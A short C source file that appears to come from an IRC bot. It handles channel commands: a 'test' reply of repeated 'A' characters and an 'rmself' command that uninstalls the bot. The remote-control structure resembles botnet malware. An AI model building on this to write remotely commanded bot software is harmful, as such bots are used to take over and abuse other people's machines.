#include "includes.h"
//#include "extern.h"

void commands( SOCKET sock, int nCmd, char *tok[32] )
{
	if ( sock == INVALID_SOCKET || nCmd < 3 ) return;

	// single parameter commands
	if ( !tok[nCmd] ) return;

	if ( !strcmp("test", tok[nCmd]) )
	{
//		irc_raw( sock, "PRIVMSG %s :it works!", szChan );
//		irc_msg( sock, "it works!" );
		irc_msg( sock,
			"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" );
		return;
	}

	if ( !strcmp("rmself", tok[nCmd]) )
	{
		bot_uninstall();
	}
}